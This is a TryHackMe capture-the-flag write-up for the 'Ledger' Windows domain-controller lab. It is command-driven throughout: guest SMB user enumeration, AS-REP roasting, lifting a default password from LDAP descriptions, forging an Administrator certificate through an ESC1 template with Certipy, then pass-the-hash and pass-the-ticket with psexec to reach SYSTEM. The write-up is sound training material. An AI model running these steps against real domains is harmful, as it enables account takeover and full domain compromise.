## TryHackMe: Ledger
Welcome to my writeup for **Ledger**, a challenging TryHackMe room focused on real-world penetration testing methodologies, privilege escalation, and system enumeration.. (Note- This lab may crash in-between multiple times so reset everytime your ping doesn't reach the target)

## 🎯 Objective
* Find the **User** flag.
* Escalate privileges and find the **Root** flag.

Start up the lab and connect using Open VPN to your own Kali instance (highly recommended)

## 🔍 1. Initial Reconnaissance (Port Scanning)
Every successful penetration test starts with reconnaissance. We need to find out what doors (ports) are open on the target machine and what services are running behind them so we can look for potential entry points. 

Before initiating the enumeration phase, let's export the target IP address as an environment variable for easier reference throughout the lab: `export target=<TARGET_IP>`

Then, we use the following **Nmap** command:
```
nmap -p- -Pn -A --min-rate 2000 --initial-rtt-timeout 50ms --max-rtt-timeout 150ms --max-retries 1 --stats-every 1m $target --open
```

Here is exactly what each flag does:

* **`-p-`**: Scans **all 65,535 ports** instead of just the top 1,000 default ports. Backdoors or uncommon services love to hide on higher ports.
* **`-Pn`**: Treats the host as online and skips the initial ping discovery. This is crucial because many Windows targets disable ICMP (ping) by default, which can cause Nmap to falsely report that the machine is down.
* **`-A`**: This is the "Aggressive" scan flag. It enables **OS detection**, **version scanning** (to see what software version is running on a port), and runs **default NSE scripts** to find basic vulnerabilities.
* **`--min-rate 2000`**: Forces Nmap to send packets at a minimum rate of 2,000 packets per second. This drastically speeds up the scan.
* **`--initial-rtt-timeout 50ms` / `--max-rtt-timeout 150ms`**: Controls how long Nmap waits for a response to a packet. By capping it at 150ms, we ensure Nmap doesn't hang forever on a slow or dropped packet.
* **`--max-retries 1`**: If a port doesn't respond, Nmap will only try to probe it one more time before moving on. This keeps the scan fast.
* **`--stats-every 1m`**: Prints a status update in your terminal every 1 minute so you know the scan hasn't frozen.
* **`--open`**: Efficient filter used to only show ports that are actively listening and accepting connections.

 ⚠️ **Beginner Tip:** While these speed optimizations (`--min-rate`, aggressive timeouts) are perfect for CTFs like TryHackMe, they can be very noisy and disruptive in real-world professional engagements. In a real pentest, this could trigger firewalls, alert blue teams, or crash fragile services!

 _Figure 1: Nmap Scan Result_

<img width="623" height="670" alt="image-244" src="https://github.com/user-attachments/assets/2d9a8b6b-f091-4a21-a251-07627b06755b" />
 <img width="620" height="645" alt="image-245" src="https://github.com/user-attachments/assets/505db9eb-5397-461a-98b8-245fea6c12dc" />

 ## 2.🧩 Analyzing the Scan Results

When you run an Nmap scan and a massive wall of text pops up, your job isn't to memorize every single line. Your job is to look at the patterns and ask:

    "What is this server's primary job, and how can I use this information?"

#### <ins>The Big Picture: What is this machine?</ins>
As a beginner, instead of looking at these ports as random numbers, you should group them by their functional relationships:

1. Operating System Confirmation- <ins>Windows</ins> 

Nmap confirms this, showing IIS 10.0 and Windows RPC services.

2. The Identity- It's a <ins>Domain Controller</ins>

When you see the following cluster of ports open together, you should immediately recognize the machine's role in the network:
Port 53 (DNS): Resolves domain names to IP addresses.
Port 88 (Kerberos): The primary authentication protocol for Active Directory.
Ports 389 / 636 (LDAP / LDAPS): Used for querying and modifying directory services.
Port 445 (SMB): File sharing, crucial for accessing SYSVOL and NETLOGON shares in a domain.

3. Critical Information Extraction

Nmap's scripts (-sC) did a lot of heavy lifting for us, extracting vital naming conventions from the LDAP, RDP, and SSL certificates:

Domain Name: <ins>thm.local</ins>
Computer Name (Hostname): <ins>LABYRINTH</ins>
Fully Qualified Domain Name (FQDN): <ins>labyrinth.thm.local</ins>
OS Build: 10.0.17763 (A quick search reveals this build number corresponds to Windows Server 2019).

Aside from the standard Active Directory ports, we also have web servers running:

Port 80 (HTTP): Microsoft IIS httpd 10.0
Port 443 (HTTPS): Also running web services with a self-signed certificate.

Often in CTF rooms, if standard SMB/RPC enumeration doesn't yield immediate results, the initial foothold lies within a custom web application hosted on these ports. However we'll first try the webservers to see if its of any importance or not.

## 3. 🕸️ Web Enumeration (Ports 80 & 443)
First, we visit the HTTP server on port 80:
http://10.114.133.159

_Figure 2:IIS Blank Website_

<img width="1229" height="674" alt="image-246" src="https://github.com/user-attachments/assets/ea3e6672-1ac1-4803-9392-184a3172e02b" />

This drops us straight onto the default Windows Server Internet Information Services (IIS) landing page. A quick check of the page source reveals nothing hidden, no comments, no hidden directories, and no links.

Next, we check the HTTPS version on port 443:
https://10.114.133.159

_Figure 3: Self Signed Certificate_

<img width="1238" height="608" alt="image-247" src="https://github.com/user-attachments/assets/77855d1c-e8be-465e-8469-c18ca436aad7" />

Because the server is using a self-signed certificate (which Nmap warned us about), our browser throws a "Potential Security Risk Ahead" warning. After accepting the risk and bypassing the warning, we are greeted by the exact same default IIS page.

With no immediate web vulnerabilities jumping out at us, it's time to pivot to the protocol that governs Active Directory environments: SMB.

## 4. 📁 SMB Enumeration
Since Nmap showed port 445 (SMB) as open, our first goal is to check what access we have without valid credentials. We can attempt to authenticate using the guest account with a blank password.

To do this, we use netexec (an updated, actively maintained fork of CrackMapExec):
```
netexec smb $target -u 'guest' -p '' --shares
```

_Figure 4: Anonymous SMB Check_

<img width="630" height="297" alt="image-248" src="https://github.com/user-attachments/assets/7729e003-d8ff-4038-b764-55301e146552" />

The output shows that our guest authentication is accepted! While we don't have read access to juicy shares like SYSVOL or NETLOGON just yet, we do have READ access to the IPC$ share.

Why does IPC$ matter?
IPC$ stands for Inter-Process Communication. Having read access to this share via a null or guest session is a massive misconfiguration. It allows an unauthenticated (or guest) user to query the server for information, including password policies, groups, and most importantly user accounts. Because we have that crucial access to IPC$, we can ask the Domain Controller to hand over a list of all its users. We do this through a technique called RID Brute-Forcing.

Every object in a Windows domain (users, groups, computers) has a Security Identifier (SID). The last part of this SID is the Relative Identifier (RID). By systematically guessing RIDs (which usually start at 1000 for standard users and increment sequentially), we can map out every user on the system.

Let's fire up netexec again with the --rid-brute flag:
```
netexec smb $target -u 'guest' -p '' --rid-brute
```

_Figure 5: SMB Rid Brute Usernames_

<img width="851" height="688" alt="image-250" src="https://github.com/user-attachments/assets/1d1f90b3-6edd-4eff-877c-f99afea8000c" />

The server responds by dumping hundreds of valid domain usernames.

## 5.🔥 Setting up for the Next Attack - AS-REP Roasting
Now that we have a massive list of valid usernames but no passwords, what is our next move? AS-REP Roasting. If any of these users have a specific Kerberos setting enabled called "Do not require Kerberos preauthentication", we can request an authentication ticket for them and crack it offline to get their plaintext password.

 Before we can launch our AS-REP roasting attack, we need to transform that massive wall of netexec output into a clean text file containing only the usernames. We can just run the command again and pipe the live output directly into our filtering tools in one smooth motion.
 
  Run this in your terminal:
```
netexec smb $target -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
```

How this works:

    netexec ... --rid-brute: Re-runs the attack to grab the data from the server.

    | (The Pipe): Instead of letting the text hit your screen, the pipe catches the output and instantly feeds it into the next command.

    grep "SidTypeUser": Filters out everything except the actual user accounts.

    awk -F'\\' '{print $2}': Uses the backslash as a cutter to chop off the THM\ domain prefix.

    awk '{print $1}': Grabs just the first word (the username) to drop the trailing (SidTypeUser) tag.

    > users.txt: Catches the final, perfectly cleaned list of names and drops them into a ready-to-use text file.

Once that finishes running, you can cat users.txt to verify you have a clean list, and you will be perfectly set up for the AS-REP roasting phase.

_Figure 6: Clean Usernames_

<img width="843" height="109" alt="image-251" src="https://github.com/user-attachments/assets/8f167d09-b2c3-4d54-998b-20818bfa2196" />

With our pristine users.txt file in hand, we are ready to hunt for vulnerable accounts.

To execute this attack, we will use Impacket's GetNPUsers.py script against our newly created list:
```
impacket-GetNPUsers thm.local/ -no-pass -usersfile users.txt -dc-ip $target
```

_Figure 7: AS-REP Roasting Results_

<img width="834" height="265" alt="image-252" src="https://github.com/user-attachments/assets/a2da1e70-a9ad-4261-b2be-8cabc185773b" />

_Figure 8: AS-REP Roasting Results_

<img width="847" height="553" alt="image-253" src="https://github.com/user-attachments/assets/c1dc72f1-cf49-4eb0-a0ca-ab0db05126bb" />

_Figure 9: AS-REP Roasting Results_

<img width="850" height="159" alt="image-254" src="https://github.com/user-attachments/assets/06ce1a8f-dda3-447c-b908-f5d3fd278ce0" />

_Figure 10: AS-REP Roasting Results_

<img width="851" height="139" alt="image-255" src="https://github.com/user-attachments/assets/54eb1ea4-644b-4a46-9b06-3f634deeb11b" />

_Figure 11: AS-REP Roasting Results_

<img width="847" height="119" alt="image-256" src="https://github.com/user-attachments/assets/bd4efda5-1a51-461c-a487-3368b5b2f423" />

### 💥 Cracking the AS-REP Hashes
As our GetNPUsers.py script chews through the users.txt file, it outputs a lot of lines stating User X doesn't have UF_DONT_REQUIRE_PREAUTH set. This is normalit means those accounts are properly secured and require a password to get a Kerberos ticket.

However, scattered throughout the output, we hit the jackpot. The script successfully pulls the AS-REP tickets for several misconfigured accounts, identifiable by the $krb5asrep$23$ prefix. In total, we managed to harvest 5 hashes.

These hashes are pieces of the Kerberos ticket encrypted with the user's actual password. Since we have them on our local Kali machine, we can attempt to crack them offline without locking out the accounts or generating excessive noise on the target network.

First, copy all 5 of the full hash strings (starting from $krb5asrep$23$ to the end of the random characters) and paste them into a new file on your machine. Let's call it hashes.txt.

To crack these, we will use John the Ripper. While John is great at auto-detecting hash types, it is always faster and more reliable to tell it exactly what it is looking at. For these specific Kerberos tickets, the format is krb5asrep. We will pair this with the classic rockyou.txt wordlist to run a dictionary attack:
```
john --format=krb5asrep --wordlist=/home/kali/rockyou.txt hashes.txt 
```

_Figure 12: Hash Cracking Attempt_

<img width="854" height="132" alt="image-257" src="https://github.com/user-attachments/assets/11560599-ba9f-4725-b8bd-7bffe56ed8a5" />

As shown in the output, John finishes its run without cracking a single password. Why did this happen?
In real-world environments (and realistic CTF rooms), administrators often enforce password complexity policies. If a user's password is over a certain length, contains special characters, or simply isn't a commonly leaked password found in rockyou.txt, a standard dictionary attack will fail. This is a classic pentesting rabbit hole. We have valid hashes, but without a massive, specialized wordlist or days of compute time for brute-forcing, they are currently useless to us. It is time to cut our losses, pivot, and look for another way in.

## 6. 📖 Pivoting to LDAP Enumeration
Since SMB and Kerberos didn't give us a direct shell, let's turn our attention back to our Nmap scan. We know port 389 (LDAP) is open.

Lightweight Directory Access Protocol (LDAP) is essentially the phonebook of Active Directory. It stores information about users, groups, computer objects, and domain policies. A common misconfiguration in AD environments is allowing Anonymous Binds. This means the server allows unauthenticated users to query this phonebook and read its contents.

Let's test if the Domain Controller allows anonymous LDAP enumeration.

Instead of using the traditional ldapsearch tool, which dumps a massive, unreadable wall of text, we can use our new favorite swiss-army knife, netexec, to cleanly extract the domain users directly from LDAP.

Let's test if the Domain Controller allows anonymous LDAP enumeration by passing blank credentials:
```
netexec ldap $target -u '' -p '' --users
```

_Figure 13: LDAP Enumeration_

<img width="1258" height="293" alt="image-258" src="https://github.com/user-attachments/assets/ce22d5c4-d02d-4d3a-802f-9d4680acaa17" />

_Figure 14: LDAP Enumeration Findings_

<img width="1262" height="191" alt="image-259" src="https://github.com/user-attachments/assets/51358473-6416-4a7c-b6da-35258cd48686" />

#### 🎯 Striking Gold: Cleartext Credentials in LDAP
Running the netexec command proves to be exactly the right move. As the tool queries the directory, it pulls down a list of 487 domain users and cleanly formats their attributes right in our terminal. As we scroll through the results, we notice that many accounts simply have "Tier 1 User" in their description field. However, looking closely at the output in Figure 14, two users immediately stand out:

* IVY_WILLIS
* SUSANNA_MCKNIGHT

Both of these accounts share the exact same, glaringly obvious description:
Please change it: `CHANGEME2023!`

This is a classic, highly realistic Active Directory vulnerability. In corporate environments, when a user forgets their password, the IT helpdesk will often reset it to a standard, temporary default (like CHANGEME2023!) and put a note in the description field. The expectation is that the user will log in and immediately change their password, after which the admin should clear the description.

However, users frequently forget to update it, and admins almost always forget to clean up the notes. Because the domain allows anonymous LDAP binds, any unauthenticated attacker on the network can read these notes and instantly hijack the accounts.

#### 🔑 Validating Our New Credentials
We now have a highly probable password (CHANGEME2023!) for two different domain users. But before we get too excited, we need to verify that these credentials actually work. In Active Directory, it's entirely possible that the users did change their passwords, but the lazy admin just never deleted the description note.

To test this without locking out the accounts, we will pivot back to SMB and use netexec to attempt authentication. Let's test both users:
```
netexec smb $target -u 'IVY_WILLIS' -p 'CHANGEME2023!'
netexec smb $target -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
```

_Figure 15: SMB Authentication_

<img width="1257" height="137" alt="image-260" src="https://github.com/user-attachments/assets/bb41ee68-d7e7-469b-8ade-dce960d8bfef" />

As we can see in the output, both commands returned a beautiful green [+]! Our assumption was correct: the temporary password CHANGEME2023! is fully valid for both IVY_WILLIS and SUSANNA_MCKNIGHT.

We have established our foothold, but right now, we are stuck standing outside the server just validating credentials. To actually explore the system, read user flags, and hunt for privilege escalation vectors, we need an interactive session.

In a Windows environment, our two primary targets for remote access are WinRM (Windows Remote Management) and RDP (Remote Desktop Protocol). Let's use netexec to test both protocols for our newly compromised accounts to see if either user belongs to the Remote Management Users or Remote Desktop Users groups.
```
netexec winrm $target -u 'IVY_WILLIS' -p 'CHANGEME2023!'
netexec winrm $target -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
netexec rdp $target -u 'IVY_WILLIS' -p 'CHANGEME2023!'
netexec rdp $target -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
```

_Figure 16: WinRM and RDP Authentication Test_

<img width="1225" height="252" alt="image-261" src="https://github.com/user-attachments/assets/2959dfd5-3224-41f3-9d60-13a4103c2de7" />

For the RDP, both Ivy and Susanna return a green [+], meaning they both have permission to log in via Remote Desktop. But if you look closely at SUSANNA_MCKNIGHT, there is a massive added bonus at the end of her line: (Pwn3d!).

<ins>What does (Pwn3d!) mean?</ins>
In tools like netexec and CrackMapExec, the (Pwn3d!) tag is the holy grail. It indicates that the credentials you provided don't just grant standard access, they grant Administrative access to the target system. Because we are targeting a Domain Controller, having local administrative access essentially means we have compromised the core of the domain!

#### 💻 Getting a GUI Shell via RDP
Since Susanna clearly has elevated privileges, she is absolutely the account we want to ride in on. We will use xfreerdp to establish a graphical remote desktop session.

Run the following command in your terminal:
```
xfreerdp /v:$target /u:'SUSANNA_MCKNIGHT' /p:'CHANGEME2023!' /cert:ignore +clipboard /dynamic-resolution /drive:/opt/tools/privesc,share
```

Figure 17: User Flag

<img width="800" height="531" alt="image-262" src="https://github.com/user-attachments/assets/52ca62c0-c08c-4b89-9bc4-53ad239fb928" />

Once the command executes, a new window will pop up showing the Windows Server login screen, bypassing the initial perimeter and dropping you straight onto Susanna's desktop where the first user flag is.

Now that we have successfully bypassed the perimeter and landed on the desktop via RDP, the very first rule of post-exploitation is establishing situational awareness. We need to know exactly who we are, what we can do, and what groups we belong to. To do this, we open up a PowerShell prompt and run the classic enumeration command: `whoami /all`

We find out that we are still just a standard user on this Domain Controller. We need to find a way to elevate our privileges to NT AUTHORITY\SYSTEM or compromise a Domain Admin account.

After running our standard local privilege escalation checks looking for unquoted service paths, AlwaysInstallElevated registry keys, or vulnerable installed software we hit a brick wall. Susanna's account is locked down tight on the local system level.

When local privilege escalation fails in a modern Windows domain, our next move is to look back out at the domain itself. Specifically, we want to look at Active Directory Certificate Services (AD CS).

<ins>What is AD CS?</ins>
AD CS is Microsoft's Public Key Infrastructure (PKI) implementation. It allows administrators to create and distribute digital certificates for things like smart card logins, secure web traffic, and file encryption. However, if the templates used to generate these certificates are misconfigured, any standard user can often request a certificate that allows them to authenticate as someone else entirely—including a Domain Admin (a class of vulnerabilities often referred to as ESC1through ESC15).

## 7. 📜 Hunting for Certificate Vulnerabilities with Certipy-AD
To enumerate the domain for vulnerable certificate templates, we use an incredible tool called Certipy-AD (a Python tool built specifically for AD CS abuse). Since we already have valid credentials for Susanna, we can run this directly from our Kali machine against the Domain Controller without needing to drop any more files onto the target server.

Let's use the find module in Certipy-AD, combined with the -vulnerable flag, which tells the tool to automatically filter out the noise and only show us templates that can be actively exploited:
```
certipy-ad find -vulnerable -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -dc-ip $target
```

_Figure 18: Certpy-AD_

<img width="793" height="266" alt="image-267" src="https://github.com/user-attachments/assets/6933a12f-e339-432c-82f1-b29cc70c9ccf" />

#### 🎯 Analyzing the Certipy Results
Let's break down what this output is actually telling us about the Domain Controller:

    Found 1 certificate authority: The domain has an active Certificate Authority (CA) named thm-LABYRINTH-CA. This is the entity we will eventually be asking to mint our forged certificate.

    Found 37 certificate templates & Found 14 enabled certificate templates: The CA has several templates ready to issue. Because we used the -vulnerable flag, Certipy is actively filtering these down behind the scenes.

    Wrote text output to '20260610061026_Certipy.txt': This is the most important line. Certipy found something exploitable and packaged all the details into this text file.

Instead of dumping a massive wall of text directly into our terminal, Certipy neatly organized its findings into both a text and JSON file. The .txt file contains the specific name of the vulnerable template, the type of vulnerability (e.g., ESC1, ESC4, ESC8), and the permissions we need to abuse it.

_Figure 19: Content of Certipy.txt_

<img width="989" height="696" alt="image-268" src="https://github.com/user-attachments/assets/49c16b9b-62d1-49f3-8c12-0f7c1a89ea7f" />

<img width="836" height="295" alt="image-269" src="https://github.com/user-attachments/assets/6223b6b5-6ab4-4ea2-9ee1-873fab6277a5" />

#### 🚨 Analyzing the Vulnerability: The Classic ESC1
Opening the Certipy.txt file reveals exactly what we were hoping for. Amidst the configuration data, Certipy flags a critical misconfiguration at the very bottom: ESC1.

Let's break down exactly why this specific template, named ServerAuth, is our golden ticket to Domain Admin. For an ESC1 attack to be viable, several specific conditions must be met, and we can see every single one of them perfectly lined up in our output:

    Enrollment Rights : THM.LOCAL\Authenticated Users
    This means that literally anyone with a valid domain account can request this certificate. Since we compromised Susanna's account, we fall into this category.

    Client Authentication : True
    The generated certificate can be used to authenticate to domain services (like logging in!).

    Enrollee Supplies Subject : True
    This is the fatal flaw. It means that when we request the certificate, the Certificate Authority (CA) allows us to supply the name that goes on it.

    Requires Manager Approval : False
    No human administrator will review our request; the CA will just blindly stamp it and hand it back to us.


<ins>The Attack Path:</ins>
Because all these conditions are met, we can walk up to the thm-LABYRINTH-CA, hand it Susanna's credentials to prove we are an "Authenticated User," and ask for a ServerAuth certificate. But instead of putting Susanna's name on it, we will tell the CA to make the certificate out to the Administrator.

#### 🖨️ Forging the Administrator Certificate
Now that we understand the vulnerability, it is time to exploit it. We will use Certipy's req (request) module to ask the CA to mint our forged certificate.

Run the following command from your Kali machine:
```
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca thm-LABYRINTH-CA -template ServerAuth -upn Administrator@thm.local -target $target
```

Breaking down the command:

    req: Tells Certipy we want to request a certificate.

    -u and -p: Susanna's credentials, which grant us the right to make the request.

    -ca thm-LABYRINTH-CA: The name of the Certificate Authority we found in the text file.

    -template ServerAuth: The specific vulnerable template we are targeting.

    -upn Administrator@thm.local: The payload. UPN stands for User Principal Name. We are explicitly telling the CA to put the Domain Admin's name on this certificate.

    -target $target: Points the request at the Domain Controller's IP address.

If this command executes successfully, Certipy will download a .pfx file to the current directory. This file is the cryptographic equivalent of the Administrator's ID badge.

_Figure 20: Error_

<img width="1166" height="149" alt="image-270" src="https://github.com/user-attachments/assets/48cf3d90-79c6-488b-b457-9126c167a543" />

 <ins>Why did this happen?</ins>
Because we didn't explicitly map the domain in our /etc/hosts file earlier, our Kali Linux machine has absolutely no idea what THM.LOCAL is or where to send the traffic. When Certipy tries to look up the Certificate Authority's location, it asks our default DNS server (which is likely a public server or local router that doesn't know anything about this internal TryHackMe lab), and the request dies. Let's do it right now:
```
echo "10.114.133.159 thm.local labyrinth.thm.local" | sudo tee -a /etc/hosts
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca thm-LABYRINTH-CA -template ServerAuth -upn Administrator@thm.local -target $target
```

_Figure 21: Request Successful_

<img width="1149" height="247" alt="image-271" src="https://github.com/user-attachments/assets/3c4d4db9-bf00-4f87-8932-cdeab5b546d4" />

<ins>It sometimes gives error so re-run it twice or thrice and it will work.</ins>

#### 🗝️ Extracting the Administrator Hash
We now have a .pfx file, which contains both the forged Administrator certificate and the private key needed to use it. However, we can't just pass a .pfx file to standard tools like Evil-WinRM or Impacket directly. We need to use this certificate to request the Administrator's NTLM hash.

Certipy has an auth module built exactly for this purpose. It will take our .pfx file, authenticate to the Domain Controller as the Administrator, and pull down the account's NTLM hash via a Kerberos PKINIT exchange. Run the following command:

```
certipy-ad auth -pfx administrator.pfx -dc-ip $target
```

_Figure 22: Extract Administrator Hash_

<img width="916" height="185" alt="image-272" src="https://github.com/user-attachments/assets/cabd7aa3-54b3-41cb-94fe-88d383eaebee" />

Certipy parses our forged administrator.pfx file, maps out the Subject Alternative Name (SAN) pointing to Administrator@thm.local, and initiates a Kerberos PKINIT exchange with the Domain Controller. The DC accepts the forged certificate, grants a Ticket Granting Ticket (TGT), and dumps the NT hash directly into our terminal.

## 8.👑 Pass-the-Hash to SYSTEM (The Final Shell)
Earlier in our enumeration, we discovered that WinRM (ports 5985/5986) was completely unresponsive, likely blocked by local firewall configurations. However, we know for a fact that Port 445 (SMB) is completely open and accepting connections.

To capitalize on this, we will use Impacket's psexec.py or wmiexec.py to pass our newly acquired hash over SMB and claim our root-level shell.

Run either of the following commands from your Kali terminal:

```
impacket-psexec thm.local/Administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
impacket-wmiexec thm.local/Administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
```

Both of these Impacket tools allow you to execute commands remotely using compromised credentials (passwords or hashes) over SMB (Port 445), but they achieve this through completely different internal mechanisms.

<ins>1. impacket-psexec (The Bludgeon)</ins>
This is a Python clone of Sysinternals' famous PsExec utility.

How it works: It connects to the ADMIN$ share via SMB, uploads a randomly named, executable service binary (e.g., remcomsv.exe), and then connects to the Windows Service Control Manager via RPC to register and start that binary as a Windows Service.

The Result: Because Windows services run with elevated privileges by default, psexec.py drops you directly into an NT AUTHORITY\SYSTEM shell.

The Catch: It is highly intrusive and incredibly loud. Generating a new service and dropping an executable onto the disk will trigger almost any modern Antivirus (AV) or Endpoint Detection and Response (EDR) agent immediately.

<ins>2. impacket-wmiexec (The Ninja)</ins>
This tool leverages Windows Management Instrumentation (WMI) to execute commands.

How it works: Instead of dropping an executable and creating a service, it communicates with the WMI repository on the target machine over DCOM/RPC. It executes commands by calling the Win32_Process.Create method. To show you the output, it redirects the command's results into a temporary file on the ADMIN$ share, reads it back to your Kali terminal, and deletes the file.

The Result: You get a semi-interactive shell running as the user you authenticated as (e.g., thm.local\Administrator), not SYSTEM.

The Catch: Because it doesn't install a service or drop a persistent binary on the disk, it is much stealthier than psexec and frequently bypasses basic AV detection.

_Figure 23: Error_

<img width="1255" height="190" alt="image-273" src="https://github.com/user-attachments/assets/0653998d-eb4b-472a-aa0d-35d9f81321ae" />

<ins>What is happening here?</ins>
This error means our credentials are perfectly valid, but the system is explicitly blocking the login due to an account restriction. In modern, hardened Active Directory environments, this usually points to one specific defensive measure: the Protected Users Group.

When high-privileged accounts (like Domain Admins) are placed into the Protected Users security group, Active Directory strips away older, weaker authentication methods. Most importantly, it completely disables NTLM authentication.

Because Pass-the-Hash (PtH) inherently relies on the NTLM protocol, the Domain Controller rejects our request immediately.

#### 🎟️ The Pivot: Pass-the-Ticket (PtT) via Kerberos
If NTLM is dead, we need to speak the protocol that Active Directory actually prefers: Kerberos.

If we look closely at the output from our previous certipy-ad auth command, Certipy didn't just dump the NTLM hash. It also did this:
```
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
```
Certipy successfully requested a Kerberos Ticket Granting Ticket (TGT) on behalf of the Administrator and saved it to our local directory as a .ccache file! Instead of passing the hash, we can load this ticket directly into our terminal's memory and perform a Pass-the-Ticket (PtT) attack.

<ins>Step 1: Load the Kerberos Ticket</ins>

Impacket tools look for a specific environment variable called KRB5CCNAME to find Kerberos tickets. We need to export this variable to point to our .ccache file.
Run this in your terminal:
```
export KRB5CCNAME=administrator.ccache
```

<ins>Step 2: Execute PsExec with Kerberos</ins>
Now we can run impacket-psexec again, but we need to make two critical changes to the command:

We must use the -k flag to tell Impacket to use Kerberos authentication, and -no-pass since we are using a ticket, not a password/hash.

We must use the target's Fully Qualified Domain Name (labyrinth.thm.local) instead of the IP address ($target). Kerberos relies heavily on strict DNS resolution; if you feed it an IP address, the authentication will fail.

Run the final exploit:
```
impacket-psexec thm.local/Administrator@labyrinth.thm.local -k -no-pass
```

Once this command fires, Impacket will seamlessly present the Kerberos ticket to the Domain Controller. The authentication will bypass the NTLM restrictions, the SMB pipe will open, and you will be dropped into your interactive C:\Windows\system32> prompt as <ins>NT AUTHORITY\SYSTEM.</ins>

_Figure 24: Login as NT Authority_

<img width="651" height="255" alt="image-274" src="https://github.com/user-attachments/assets/49a59706-5dda-4f3f-93fd-2a727bc82cb4" />

_Figure 25: Root Flag_

<img width="618" height="238" alt="image-275" src="https://github.com/user-attachments/assets/c46c5fae-a954-4e94-94e8-79fb48005a68" />
